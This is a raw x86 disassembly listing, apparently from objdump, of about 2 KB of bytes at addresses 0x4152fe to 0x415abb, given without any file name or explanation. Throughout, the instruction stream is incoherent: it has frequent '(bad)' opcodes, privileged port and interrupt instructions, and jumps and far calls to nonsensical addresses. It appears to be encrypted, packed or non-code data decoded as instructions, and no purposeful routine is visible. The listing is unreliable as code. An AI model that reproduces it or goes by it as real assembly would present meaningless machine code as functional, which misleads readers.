  4152fe:	mov    al,ds:0xd87ea40
  415303:	fnstcw WORD PTR [edi-0x29618d76]
  415309:	daa    
  41530a:	jle    0x415345
  41530c:	aaa    
  41530d:	jbe    0x41538d
  41530f:	cdq    
  415310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415311:	adc    eax,0x3c200a88
  415316:	int    0x4c
  415318:	sub    cl,BYTE PTR [edx-0x4]
  41531b:	inc    edx
  41531c:	pop    ebx
  41531d:	ja     0x41531a
  41531f:	stos   DWORD PTR es:[edi],eax
  415320:	add    BYTE PTR [ebp+0x28006619],dh
  415326:	cmp    DWORD PTR [ecx-0x55636122],edx
  41532c:	call   0xa921609b
  415331:	sub    esi,DWORD PTR [edx+edi*4+0x15]
  415335:	inc    edx
  415336:	repnz push esp
  415338:	sub    esp,eax
  41533a:	lods   al,BYTE PTR ds:[esi]
  41533b:	pop    ebp
  41533c:	js     0x4152e3
  41533e:	data16 lahf 
  415340:	fdiv   QWORD PTR [eax-0x2e]
  415343:	jl     0x415343
  415345:	and    eax,0x765d701e
  41534a:	cdq    
  41534b:	les    ebp,FWORD PTR [edi]
  41534d:	cs push edi
  41534f:	dec    ecx
  415350:	push   edx
  415351:	mov    dl,0xcc
  415353:	ret    0x2df7
  415356:	xor    eax,0xdda45492
  41535b:	fwait
  41535c:	and    esp,edi
  41535e:	ds pusha 
  415360:	add    al,bl
  415362:	jecxz  0x41536e
  415364:	repnz in al,dx
  415366:	and    ebx,DWORD PTR [edi-0x34]
  415369:	arpl   WORD PTR [edi+edx*2+0x6f0d22c],cx
  415370:	jnp    0x41534a
  415372:	xor    ebp,esp
  415374:	sub    BYTE PTR [edx],ah
  415376:	in     al,0x96
  415378:	icebp  
  415379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41537a:	imul   esi,DWORD PTR [ebx],0xa6886370
  415380:	pop    es
  415381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415382:	ret    0x6892
  415385:	xchg   esi,eax
  415386:	jae    0x415345
  415388:	jl     0x4153be
  41538a:	and    esi,DWORD PTR ds:0xa50879b
  415390:	call   0x55abdf6e
  415395:	mov    BYTE PTR [ebx-0xeb9f192],bh
  41539b:	add    BYTE PTR [esi],0xc2
  41539e:	in     eax,dx
  41539f:	pushf  
  4153a0:	out    dx,eax
  4153a1:	pop    ss
  4153a2:	dec    edi
  4153a3:	rcr    BYTE PTR [esi+0x17448d6a],0xd0
  4153aa:	adc    BYTE PTR [ebx+0x7935697e],ch
  4153b0:	mov    ebx,DWORD PTR [eax+ebx*1]
  4153b3:	mov    dh,0xfc
  4153b5:	jl     0x41534c
  4153b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153b8:	lahf   
  4153b9:	inc    esi
  4153ba:	ss cli 
  4153bc:	xor    BYTE PTR [ebx+0x40],bl
  4153bf:	lock pop ds
  4153c1:	ss in  al,0x96
  4153c4:	(bad)  
  4153c5:	cld    
  4153c6:	mov    esp,0xf66a28cd
  4153cb:	cmc    
  4153cc:	jle    0x4153eb
  4153ce:	ret    
  4153cf:	repnz outs dx,DWORD PTR ds:[esi]
  4153d1:	and    dh,dl
  4153d3:	push   esp
  4153d4:	sbb    eax,0xb807d56
  4153d9:	adc    edi,ecx
  4153db:	jmp    DWORD PTR [ecx+0xf]
  4153de:	fsubr  st(2),st
  4153e0:	push   ebx
  4153e1:	retf   
  4153e2:	in     eax,0xe6
  4153e4:	xchg   esi,eax
  4153e5:	push   es
  4153e6:	aas    
  4153e7:	call   0x133f71ab
  4153ec:	fnstenv [edi-0x19]
  4153ef:	jno    0x4153ca
  4153f1:	mov    al,ds:0xfc47d4e0
  4153f6:	pop    ebp
  4153f7:	push   ebx
  4153f8:	mov    ds:0xc5cbc048,eax
  4153fd:	jecxz  0x415397
  4153ff:	sbb    DWORD PTR [esi],edx
  415401:	dec    edx
  415402:	jno    0x415428
  415404:	push   0x66e269cc
  415409:	mov    bh,0xf9
  41540b:	mov    BYTE PTR [eax-0x17],dl
  41540e:	les    eax,FWORD PTR [eax]
  415410:	adc    BYTE PTR [ebp+0x52b8690c],bl
  415416:	cmp    eax,0x1af91c0
  41541b:	or     ah,ah
  41541d:	cs push cs
  41541f:	jmp    0x5fb2:0xfc216ae5
  415426:	jecxz  0x4153ab
  415428:	cmp    al,0x44
  41542a:	lock fild QWORD PTR ds:[ecx]
  41542e:	pop    edx
  41542f:	imul   ecx,DWORD PTR [esi],0x7e
  415432:	mov    ebp,0x4086655a
  415437:	fadd   DWORD PTR [edi-0x42]
  41543a:	push   DWORD PTR [ebx+0x4a]
  41543d:	push   cs
  41543e:	inc    esp
  41543f:	jne    0x41540a
  415441:	xor    DWORD PTR [ebp+0xf],edi
  415444:	(bad)  
  415445:	sbb    esp,DWORD PTR [ecx]
  415447:	sbb    esi,DWORD PTR [ebp-0x4b]
  41544a:	dec    ebx
  41544b:	mov    al,ds:0xddd00e26
  415450:	mov    ebx,ecx
  415452:	jl     0x4154b4
  415454:	(bad)  
  415456:	in     eax,dx
  415457:	ja     0x415416
  415459:	pop    edx
  41545a:	lds    ecx,FWORD PTR [ebx]
  41545c:	call   0x8583:0x4071e4e5
  415463:	mov    bh,0xde
  415465:	dec    edx
  415466:	rcr    DWORD PTR [eax+esi*2],1
  415469:	les    ebx,FWORD PTR [edx]
  41546b:	inc    ecx
  41546c:	inc    ebp
  41546d:	bound  ebx,QWORD PTR [esi+0x57]
  415470:	cmovle eax,DWORD PTR [ebx]
  415473:	sbb    edx,0x3b
  415476:	push   ebx
  415477:	sub    DWORD PTR [edx-0x4d614cde],0xffffffd4
  41547e:	xchg   edi,eax
  41547f:	stos   DWORD PTR es:[edi],eax
  415480:	addr16 push esp
  415482:	(bad)  
  415483:	xchg   edi,eax
  415484:	mov    ds:0x55878203,eax
  415489:	push   esp
  41548a:	dec    edx
  41548b:	mov    dh,BYTE PTR [eax]
  41548d:	xor    DWORD PTR [ecx],eax
  41548f:	xchg   esi,eax
  415490:	in     al,0x7d
  415492:	mov    esp,DWORD PTR [esi]
  415494:	repnz shl BYTE PTR ds:0xdbf692d,cl
  41549b:	mov    WORD PTR [edi+0x6784a78],ss
  4154a1:	or     al,0x63
  4154a3:	inc    edi
  4154a4:	mov    al,ds:0x6c47ebe3
  4154a9:	test   BYTE PTR [edi-0x61ce9738],ah
  4154af:	mov    al,ds:0x612b658a
  4154b4:	add    dh,0x2e
  4154b7:	dec    ebx
  4154b8:	jg     0x41546a
  4154ba:	dec    ecx
  4154bb:	add    bh,0xf4
  4154be:	push   edi
  4154bf:	fdiv   QWORD PTR [esi-0x2f355314]
  4154c5:	sti    
  4154c6:	ja     0x41546c
  4154c8:	mov    edx,0x7bc45d95
  4154cd:	retf   
  4154ce:	je     0x415511
  4154d0:	sub    ch,BYTE PTR ds:0xcab17716
  4154d6:	inc    esp
  4154d7:	cmp    al,0xe0
  4154d9:	xchg   ecx,eax
  4154da:	(bad)  
  4154db:	sti    
  4154dc:	test   al,0x87
  4154de:	xor    eax,0x622bed1e
  4154e3:	pusha  
  4154e4:	inc    esp
  4154e5:	add    DWORD PTR [edx],ebp
  4154e7:	leave  
  4154e8:	pop    ebx
  4154e9:	mov    ebx,0xf3659712
  4154ee:	pusha  
  4154ef:	sti    
  4154f0:	push   esi
  4154f1:	mov    ds,WORD PTR ds:0xc47d2ffe
  4154f7:	cmp    esi,DWORD PTR [ebx+0x11]
  4154fa:	xchg   ecx,eax
  4154fb:	dec    ecx
  4154fc:	lahf   
  4154fd:	push   ds
  4154fe:	or     al,BYTE PTR [ebp-0x473f12fa]
  415504:	out    dx,eax
  415505:	and    BYTE PTR [esi],ah
  415507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415508:	fisub  WORD PTR [ecx+ebp*4]
  41550b:	mov    eax,ds:0xe2e09987
  415510:	fistp  DWORD PTR [ecx-0x7e]
  415514:	cwde   
  415515:	pop    ebx
  415516:	imul   ebp,DWORD PTR [edi],0x46
  415519:	into   
  41551a:	out    dx,al
  41551b:	bound  esp,QWORD PTR [edi+0x7c1a1b9d]
  415521:	sti    
  415522:	push   eax
  415523:	xor    al,0x77
  415525:	and    BYTE PTR [ecx+0x397d9257],bh
  41552b:	fwait
  41552c:	push   esp
  41552d:	(bad)  
  41552e:	and    al,0x5e
  415530:	mov    ds:0x9dc687e1,al
  415535:	mov    ecx,0x8e0b1b84
  41553a:	fnsave [ecx]
  41553c:	loope  0x4154d3
  41553e:	out    dx,eax
  41553f:	adc    BYTE PTR [eax-0x3],dl
  415542:	push   0x87a6c214
  415547:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415548:	add    DWORD PTR [edi+0x68],0xb64540ed
  41554f:	push   ebp
  415550:	in     eax,dx
  415551:	mov    edx,0x646a84c5
  415556:	add    edx,DWORD PTR [ebx+0x1b114328]
  41555c:	adc    DWORD PTR [edi-0x2f545582],ebp
  415562:	(bad)  
  415563:	jae    0x415574
  415565:	cdq    
  415566:	jg     0x4155b6
  415568:	outs   dx,BYTE PTR ds:[esi]
  415569:	ins    BYTE PTR es:[edi],dx
  41556a:	or     DWORD PTR [edi],edi
  41556c:	ja     0x415514
  41556e:	rol    BYTE PTR fs:[esp+eiz*4+0x62ae3bb7],0x1e
  415577:	lds    esi,FWORD PTR [ebp+0x2fc1ac3e]
  41557d:	in     eax,0xd
  41557f:	and    dl,BYTE PTR [ebp-0x61ff45f3]
  415585:	ror    BYTE PTR [eax+0x70],cl
  415588:	pop    es
  415589:	es test al,0x69
  41558c:	inc    ecx
  41558d:	and    eax,0x12c5fdcb
  415592:	dec    esp
  415593:	pop    ebx
  415594:	xchg   esp,eax
  415595:	inc    ebp
  415596:	lods   al,BYTE PTR ds:[esi]
  415597:	inc    edx
  415598:	in     al,0x70
  41559a:	inc    edx
  41559b:	xchg   DWORD PTR [edx-0x2aad448f],edi
  4155a1:	pop    ss
  4155a2:	repz dec ebp
  4155a4:	aaa    
  4155a5:	and    al,0xd8
  4155a7:	fwait
  4155a8:	cli    
  4155a9:	inc    ebp
  4155aa:	xor    eax,DWORD PTR [ecx-0x2c]
  4155ad:	lahf   
  4155ae:	std    
  4155af:	mov    al,0xf8
  4155b1:	sub    eax,0x7b875efd
  4155b6:	pop    ebp
  4155b7:	scas   eax,DWORD PTR es:[edi]
  4155b8:	jbe    0x415581
  4155ba:	push   esi
  4155bb:	or     BYTE PTR [edi],cl
  4155bd:	not    ebx
  4155bf:	lods   al,BYTE PTR ds:[esi]
  4155c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155c1:	les    esp,FWORD PTR [esi-0x69278df4]
  4155c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155c8:	retf   0x68d3
  4155cb:	xchg   esp,eax
  4155cc:	or     cl,0xf1
  4155cf:	gs aad 0x42
  4155d2:	dec    esi
  4155d3:	leave  
  4155d4:	(bad)  
  4155d5:	fldcw  WORD PTR [ecx-0x16]
  4155d8:	sub    BYTE PTR ds:0xddb6fb96,cl
  4155de:	inc    eax
  4155df:	push   ss
  4155e0:	pop    ss
  4155e1:	jns    0x415588
  4155e3:	call   0xa12d:0x2d35dcf6
  4155ea:	popf   
  4155eb:	lahf   
  4155ec:	enter  0x3420,0x26
  4155f0:	jg     0x41565f
  4155f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155f3:	mov    ebp,0x28be217c
  4155f8:	xchg   BYTE PTR [edx-0x2441d221],dh
  4155fe:	lods   eax,DWORD PTR ds:[esi]
  4155ff:	jge    0x4155de
  415601:	dec    ebx
  415602:	push   ebx
  415603:	(bad)  [eax+0x3894996d]
  415609:	lods   al,BYTE PTR ds:[esi]
  41560a:	ins    DWORD PTR es:[edi],dx
  41560b:	add    al,0x56
  41560d:	sub    dh,0xa9
  415610:	jne    0x41564c
  415612:	(bad)  [ebp+0x4a1f72b3]
  415618:	iret   
  415619:	(bad)  
  41561a:	loopne 0x4155f8
  41561c:	mov    dh,0xdf
  41561e:	xchg   DWORD PTR [ebx+0x38b1d290],edi
  415624:	pop    eax
  415625:	lock mov edx,0x4e3d1a02
  41562b:	push   es
  41562c:	inc    ebp
  41562d:	pop    edx
  41562e:	aaa    
  41562f:	(bad)  
  415630:	fwait
  415631:	mov    ch,BYTE PTR [ebp-0x62848a86]
  415637:	jo     0x415624
  415639:	loop   0x4156a4
  41563b:	rcr    DWORD PTR [ebp-0x27948527],1
  415641:	dec    eax
  415642:	hlt    
  415643:	cli    
  415644:	mov    dl,0xe4
  415646:	inc    ebp
  415647:	(bad)  
  415649:	mov    ds:0xf749520f,al
  41564e:	sti    
  41564f:	call   0xc04c:0x8c6ed891
  415656:	dec    ebx
  415657:	add    eax,0xe4b73bc6
  41565c:	and    ebx,esp
  41565e:	push   eax
  41565f:	aam    0x25
  415661:	push   ss
  415662:	cs or  dh,bl
  415665:	aaa    
  415666:	lds    eax,FWORD PTR [ebx-0x72303b5c]
  41566c:	cs xor ebp,ebp
  41566f:	inc    ebp
  415670:	push   ebx
  415671:	sar    DWORD PTR [ebx+ebx*1-0x15],cl
  415675:	cmp    eax,0xd9fe684
  41567a:	mov    esp,DWORD PTR [ebx-0x1a4cfca2]
  415680:	shl    DWORD PTR [eax],1
  415682:	mov    WORD PTR [edi+0x1fb0f483],gs
  415688:	add    eax,DWORD PTR [esi-0x76bf99a3]
  41568e:	scas   eax,DWORD PTR es:[edi]
  41568f:	daa    
  415690:	and    ecx,DWORD PTR [edx+ecx*1-0x320c404f]
  415697:	pcmpeqb mm2,QWORD PTR [eax]
  41569a:	dec    esi
  41569b:	jle    0x4156eb
  41569d:	into   
  41569e:	or     bh,ch
  4156a0:	sub    esp,edx
  4156a2:	scas   eax,DWORD PTR es:[edi]
  4156a3:	or     bh,BYTE PTR [edi+edi*4]
  4156a6:	mov    edx,DWORD PTR [ecx+0x1e0ca144]
  4156ac:	mov    ecx,0x2e2e6b7c
  4156b1:	and    BYTE PTR [edi],0x20
  4156b4:	or     eax,0x9d544d5c
  4156b9:	loop   0x41569e
  4156bb:	push   0x3e7dd86a
  4156c0:	mov    eax,0xbf1337c4
  4156c5:	cwde   
  4156c6:	mov    DWORD PTR [ebx+0x34],eax
  4156c9:	mov    cl,0xdb
  4156cb:	jo     0x415652
  4156cd:	sub    BYTE PTR [eax+ebp*4+0x51],bh
  4156d1:	dec    edi
  4156d2:	jp     0x4156f9
  4156d4:	loope  0x415739
  4156d6:	lds    ebx,FWORD PTR [esp+ebx*8]
  4156d9:	push   0x1b
  4156db:	add    eax,eax
  4156dd:	out    0x7,al
  4156df:	push   ebx
  4156e0:	or     DWORD PTR [ecx+edi*2],0x1daeb4c7
  4156e7:	(bad)  
  4156e8:	jle    0x415745
  4156ea:	leave  
  4156eb:	fsub   DWORD PTR [esi+eax*8]
  4156ee:	mov    eax,0xee478133
  4156f3:	imul   ebx,DWORD PTR [edi+0x138567f9],0xffffffc3
  4156fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156fb:	and    al,0x1f
  4156fd:	lds    ecx,FWORD PTR [ebx]
  4156ff:	data16 jle 0x4156c6
  415702:	mov    al,ds:0x4bd7c97a
  415707:	jmp    0x51d5:0x35a50cac
  41570e:	clc    
  41570f:	push   edx
  415710:	popa   
  415711:	mov    ebp,DWORD PTR [edx]
  415713:	(bad)  [edx-0x907dddf]
  415719:	cdq    
  41571a:	inc    edi
  41571b:	mov    ecx,0x9f0905b3
  415720:	push   ss
  415721:	test   DWORD PTR [eax+0x2b4c36fb],ebx
  415727:	cmp    ebx,DWORD PTR [ebx+ebx*1+0xa33c73]
  41572e:	push   edi
  41572f:	(bad)  
  415730:	scas   eax,DWORD PTR es:[edi]
  415731:	cmp    ah,BYTE PTR [eax]
  415733:	add    eax,0x11af3f74
  415738:	and    edx,DWORD PTR [ebp+0x0]
  41573b:	ret    0xa59c
  41573e:	repz out 0x8a,al
  415741:	rcr    DWORD PTR [ebx+0x5565ac7f],cl
  415747:	shl    dl,1
  415749:	call   0x88de6eba
  41574e:	ja     0x41572f
  415750:	mov    eax,0x8c52ef3f
  415755:	lods   al,BYTE PTR ds:[esi]
  415756:	(bad)  
  415757:	push   esi
  415758:	stc    
  415759:	fadd   st(4),st
  41575b:	xchg   DWORD PTR [edi],esp
  41575d:	mov    dl,0x61
  41575f:	aas    
  415760:	popf   
  415761:	add    eax,0xcb0758c7
  415766:	dec    eax
  415767:	repz hlt 
  415769:	jne    0x415791
  41576b:	stos   BYTE PTR es:[edi],al
  41576c:	sub    al,0x90
  41576e:	out    0x9b,eax
  415770:	pop    ebx
  415771:	add    BYTE PTR [esi-0x3624b6af],ch
  415777:	cmp    dl,BYTE PTR [ebp-0x3]
  41577a:	inc    ebx
  41577b:	cld    
  41577c:	mov    dl,BYTE PTR [ebx+esi*4-0x3520c781]
  415783:	cdq    
  415784:	mov    eax,0xb7ad01f2
  415789:	rol    BYTE PTR [ebx+0x5],0x95
  41578d:	lock cwde 
  41578f:	aaa    
  415790:	call   0x279e32c0
  415795:	cmc    
  415796:	clc    
  415797:	xchg   ecx,eax
  415798:	push   esi
  415799:	or     al,bl
  41579b:	xor    edi,esp
  41579d:	es loope 0x4157ae
  4157a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157a1:	pop    esi
  4157a2:	in     al,0xad
  4157a4:	sbb    DWORD PTR [esi+0x1],eax
  4157a7:	scas   eax,DWORD PTR es:[edi]
  4157a8:	sbb    dh,ah
  4157aa:	iret   
  4157ab:	jb     0x415737
  4157ad:	in     eax,0xaf
  4157af:	adc    eax,0xc6cfed01
  4157b4:	int3   
  4157b5:	popf   
  4157b6:	jmp    0x4157fe
  4157b8:	jmp    DWORD PTR [ecx]
  4157ba:	add    dl,BYTE PTR [esi+0x71c4fce3]
  4157c0:	mov    ch,0xe4
  4157c2:	dec    ebp
  4157c3:	and    ah,BYTE PTR [edx+0x6e]
  4157c6:	dec    eax
  4157c7:	gs sbb edx,ecx
  4157ca:	popa   
  4157cb:	clc    
  4157cc:	pushf  
  4157cd:	in     al,dx
  4157ce:	test   BYTE PTR ds:0x41feab98,bh
  4157d4:	repz xlat BYTE PTR ds:[ebx]
  4157d6:	pop    edi
  4157d7:	fild   DWORD PTR [edx+0x58]
  4157da:	ds xor dh,ah
  4157dd:	lods   eax,DWORD PTR ds:[esi]
  4157de:	(bad)  
  4157df:	repz jb 0x41577c
  4157e2:	int3   
  4157e3:	test   eax,0xbadfc458
  4157e8:	push   esi
  4157e9:	mov    DWORD PTR [ebx-0x55063f72],ebp
  4157ef:	and    ah,BYTE PTR [ecx]
  4157f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157f2:	(bad)  
  4157f3:	pop    ss
  4157f4:	out    dx,eax
  4157f5:	inc    eax
  4157f6:	jne    0x415833
  4157f8:	add    esi,DWORD PTR [ecx]
  4157fa:	adc    edx,DWORD PTR [esi-0x17]
  4157fd:	xor    edx,0xba699573
  415803:	shrd   edx,edi,0x2
  415807:	shr    edi,0x2
  41580a:	or     edi,DWORD PTR [ebp+0x14]
  41580d:	xor    ecx,ecx
  41580f:	or     edx,ecx
  415811:	mov    ecx,DWORD PTR [ebx]
  415813:	mov    DWORD PTR [ebp-0x64],edi
  415816:	mov    edi,DWORD PTR [ebx+0x4]
  415819:	mov    edi,ecx
  41581b:	xor    ecx,ecx
  41581d:	shl    edi,0x1e
  415820:	jmp    0x415daa
  415825:	scas   al,BYTE PTR es:[edi]
  415826:	rcr    BYTE PTR ds:[ebx+0x20],0x59
  41582b:	and    al,0x32
  41582d:	ja     0x41587c
  41582f:	lods   al,BYTE PTR ds:[esi]
  415830:	scas   al,BYTE PTR es:[edi]
  415831:	sbb    al,dl
  415833:	pusha  
  415834:	outs   dx,BYTE PTR ds:[esi]
  415835:	stc    
  415836:	mov    ebp,0x43d160c
  41583b:	push   ss
  41583c:	push   ss
  41583d:	and    eax,DWORD PTR [edi+eax*1]
  415840:	ss jge 0x4157cd
  415843:	pop    ss
  415844:	shl    DWORD PTR [ecx+0x3a],0x17
  415848:	gs in  al,0x5e
  41584b:	jg     0x415874
  41584d:	je     0x4158c0
  41584f:	sbb    ch,BYTE PTR [esi+eax*4-0x5b]
  415853:	call   DWORD PTR [ebx]
  415855:	popa   
  415856:	pop    esp
  415857:	js     0x415827
  415859:	sub    BYTE PTR [ebx],0xa8
  41585c:	push   esi
  41585d:	loope  0x4158aa
  41585f:	fs push edx
  415861:	or     DWORD PTR [edx],edi
  415863:	lds    eax,FWORD PTR [ebx]
  415865:	aam    0xb3
  415867:	dec    ebx
  415868:	ss bnd jb 0x415896
  41586c:	scas   eax,DWORD PTR es:[edi]
  41586d:	outs   dx,DWORD PTR ds:[esi]
  41586e:	mov    dh,0xa0
  415870:	sub    eax,0x8e9bbef9
  415875:	push   cs
  415876:	adc    edx,0xcabb7d19
  41587c:	rol    esp,0xa4
  41587f:	mov    dl,0x42
  415881:	in     al,0x67
  415883:	leave  
  415884:	push   edi
  415885:	ret    0xd194
  415888:	jecxz  0x415846
  41588a:	popf   
  41588b:	or     DWORD PTR [ecx-0x364e52d0],ebp
  415891:	test   eax,0x924a3a21
  415896:	sub    al,0x1e
  415898:	pop    ecx
  415899:	cmp    edx,DWORD PTR [ebp+edi*1+0x53]
  41589d:	clc    
  41589e:	xchg   BYTE PTR [edi+edx*1],bl
  4158a1:	dec    ebp
  4158a2:	pop    es
  4158a3:	dec    DWORD PTR [edi+0x65]
  4158a6:	repz or DWORD PTR [esi+0x75],eax
  4158aa:	jno    0x4158c1
  4158ac:	repnz dec ebx
  4158ae:	retf   0xdc73
  4158b1:	and    esi,0xaa82f9a3
  4158b7:	int    0x6b
  4158b9:	push   0xffffff85
  4158bb:	mov    al,0x9b
  4158bd:	push   edi
  4158be:	sub    edx,ecx
  4158c0:	(bad)  
  4158c1:	cmp    al,BYTE PTR [esi]
  4158c3:	cmp    edx,DWORD PTR [eax]
  4158c5:	in     al,0x7b
  4158c7:	inc    ebp
  4158c8:	leave  
  4158c9:	je     0x4158e5
  4158cb:	(bad)  [ebp-0x39]
  4158ce:	jmp    eax
  4158d0:	xchg   bl,ah
  4158d2:	add    bh,BYTE PTR [ebx+eiz*8+0x1d84c318]
  4158d9:	or     DWORD PTR [edi-0x2f],esi
  4158dc:	(bad)  
  4158dd:	sbb    ebx,ecx
  4158df:	(bad)  
  4158e1:	loop   0x4158c1
  4158e3:	push   ecx
  4158e4:	push   edi
  4158e5:	rcr    DWORD PTR [ebx],1
  4158e7:	xchg   cl,al
  4158e9:	dec    ebp
  4158ea:	ss mov edx,0x8caba47f
  4158f0:	inc    esp
  4158f1:	fild   WORD PTR [ecx]
  4158f3:	pop    es
  4158f4:	ins    DWORD PTR es:[edi],dx
  4158f5:	imul   eax,ebp,0x1af7241a
  4158fb:	lea    eax,[ecx+ebp*1-0x1e]
  4158ff:	pop    ebx
  415900:	xchg   edi,eax
  415901:	sub    ebx,DWORD PTR [eax+0x69]
  415904:	xor    al,0x82
  415906:	xacquire xchg BYTE PTR [ebx-0x75],ch
  41590a:	or     esp,DWORD PTR [esi]
  41590c:	mov    ecx,0x963f3997
  415911:	repz ret 
  415913:	fnsave [edi-0x536762b0]
  415919:	lahf   
  41591a:	loope  0x415995
  41591c:	xor    eax,0x5f1d50b4
  415921:	rcr    DWORD PTR [edx+0x74],cl
  415924:	dec    ecx
  415925:	int3   
  415926:	sub    ch,BYTE PTR [ebp+edi*2-0x78]
  41592a:	push   cs
  41592b:	adc    DWORD PTR [esi+eax*4+0x4a61acd8],edx
  415932:	sahf   
  415933:	xlat   BYTE PTR ds:[ebx]
  415934:	jbe    0x415995
  415936:	retf   0xe82f
  415939:	rcr    DWORD PTR [edx],0xfd
  41593c:	pushf  
  41593d:	sbb    al,BYTE PTR [esi-0x5f]
  415940:	ins    BYTE PTR es:[edi],dx
  415941:	inc    eax
  415942:	sub    edi,DWORD PTR [eax+0xa2759ba]
  415948:	pusha  
  415949:	adc    ch,BYTE PTR [edx-0x1b]
  41594c:	pop    ss
  41594d:	jecxz  0x4158f7
  41594f:	adc    eax,0x79efd50
  415954:	je     0x415931
  415956:	jo     0x41592e
  415958:	mov    ah,0x18
  41595a:	fidivr WORD PTR [ecx+0x59]
  41595d:	repnz mov bl,0x12
  415960:	popa   
  415961:	adc    cl,cl
  415963:	add    ecx,DWORD PTR [eax+0x2d311009]
  415969:	pop    ss
  41596a:	repz sub cl,BYTE PTR [edx-0xaffe974]
  415971:	inc    eax
  415972:	ins    BYTE PTR es:[edi],dx
  415973:	mov    esp,0x61da38d3
  415978:	sub    ebx,0xe84513ef
  41597e:	fild   DWORD PTR es:[edi]
  415981:	or     bh,dl
  415983:	adc    cl,ch
  415985:	repz loop 0x415940
  415988:	ret    0x7b
  41598b:	pop    ds
  41598c:	enter  0x7c0e,0x31
  415990:	xor    DWORD PTR [ebx-0x51fb4410],eax
  415996:	inc    ebx
  415997:	jns    0x41596d
  415999:	shr    DWORD PTR [esi],1
  41599b:	std    
  41599c:	out    dx,al
  41599d:	(bad)  
  41599e:	sbb    ecx,DWORD PTR [edi+0x68]
  4159a1:	cmc    
  4159a2:	repz sahf 
  4159a4:	inc    eax
  4159a5:	sub    al,0x77
  4159a7:	push   es
  4159a8:	rep stos BYTE PTR es:[edi],al
  4159aa:	pop    es
  4159ab:	fmul   DWORD PTR [esp+eax*2-0x1d]
  4159af:	in     al,0x76
  4159b1:	or     esi,DWORD PTR [edx+0x13e64f3c]
  4159b7:	sbb    bh,BYTE PTR [edx+0x531edc4e]
  4159bd:	xchg   edi,eax
  4159be:	in     al,0xca
  4159c0:	mov    cl,BYTE PTR [esp+ebx*2-0x37]
  4159c4:	outs   dx,DWORD PTR ds:[esi]
  4159c5:	cld    
  4159c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159c7:	repz mov ds:0x4b6ecab9,eax
  4159cd:	imul   eax,DWORD PTR [edx-0x10],0xfffffff0
  4159d1:	mov    ch,BYTE PTR ds:0x83aa0656
  4159d7:	fsub   QWORD PTR [ebp-0x62238410]
  4159dd:	push   ss
  4159de:	add    DWORD PTR [esi-0x2b59fcb9],edi
  4159e4:	inc    edi
  4159e5:	inc    eax
  4159e6:	sbb    bh,BYTE PTR [eax-0x6d4eff14]
  4159ec:	shl    BYTE PTR [edi+eiz*1+0x4e066133],1
  4159f3:	popw   ss
  4159f5:	fidivr WORD PTR [ebx+eax*4]
  4159f8:	sub    al,0xf0
  4159fa:	and    eax,0x3e1868b5
  4159ff:	test   DWORD PTR [eax+0x76],esi
  415a02:	cmp    DWORD PTR [esi+ebp*2],0xffffff8d
  415a06:	enter  0xe3d1,0x53
  415a0a:	outs   dx,BYTE PTR ds:[esi]
  415a0b:	cmp    esi,DWORD PTR [esi]
  415a0d:	jp     0x415a7d
  415a0f:	cld    
  415a10:	mov    ch,0x4f
  415a12:	sub    eax,0x828c35e2
  415a17:	lahf   
  415a18:	repz push ebp
  415a1a:	pop    ecx
  415a1b:	or     ah,cl
  415a1d:	cdq    
  415a1e:	inc    ecx
  415a1f:	sub    al,0xdc
  415a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a22:	dec    eax
  415a23:	aaa    
  415a24:	add    ah,BYTE PTR [ecx-0x6e4784f7]
  415a2a:	sub    al,0xe4
  415a2c:	pop    edx
  415a2d:	inc    edx
  415a2e:	mov    eax,0x6c0c2e2b
  415a33:	nop
  415a34:	ret    
  415a35:	mov    cl,0x13
  415a37:	cld    
  415a38:	xchg   edx,eax
  415a39:	push   edi
  415a3a:	add    al,0x87
  415a3c:	jp     0x4159fa
  415a3e:	xchg   ecx,eax
  415a3f:	xchg   ebp,eax
  415a40:	pop    ds
  415a41:	xchg   DWORD PTR [ebp-0xb],ebp
  415a44:	dec    esi
  415a45:	fistp  QWORD PTR [eax+0x23327187]
  415a4b:	push   0xc7db5669
  415a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a51:	mov    edx,DWORD PTR [edx-0x45]
  415a54:	sbb    BYTE PTR [ebx-0x74],cl
  415a57:	ret    
  415a58:	push   cs
  415a59:	push   cs
  415a5a:	or     BYTE PTR [edx],bl
  415a5c:	scas   eax,DWORD PTR es:[edi]
  415a5d:	jns    0x415a22
  415a5f:	mov    ds:0x8251c3b9,al
  415a64:	xlat   BYTE PTR ds:[ebx]
  415a65:	sbb    BYTE PTR [edi],bh
  415a67:	test   BYTE PTR [edi],ch
  415a69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a6a:	mov    BYTE PTR [edi-0x48],bl
  415a6d:	jbe    0x4159f9
  415a6f:	mov    cl,0x27
  415a71:	sub    al,0x16
  415a73:	jmp    0x1913bab6
  415a78:	fwait
  415a79:	pop    ss
  415a7a:	xor    DWORD PTR [edi+ebx*1+0x21],esp
  415a7e:	xchg   ebp,eax
  415a7f:	xchg   BYTE PTR [edx+0x6b],ch
  415a82:	push   ds
  415a83:	ss jns 0x415a5f
  415a86:	xor    al,0x35
  415a88:	mov    cl,0x47
  415a8a:	arpl   WORD PTR [ebx],cx
  415a8c:	xchg   DWORD PTR [ebx+0x4de12065],esi
  415a92:	or     eax,0x6c64c86d
  415a97:	mov    eax,ds:0xa7cd3392
  415a9c:	or     cl,al
  415a9e:	in     al,0x96
  415aa0:	or     eax,0xe033abb2
  415aa5:	adc    bl,BYTE PTR [ebp+0x6063aa1]
  415aab:	add    eax,0x804dcc66
  415ab0:	icebp  
  415ab1:	jnp    0x415b23
  415ab3:	push   ecx
  415ab4:	arpl   di,bp
  415ab6:	mov    ecx,0x71731f
  415abb:	dec    edi
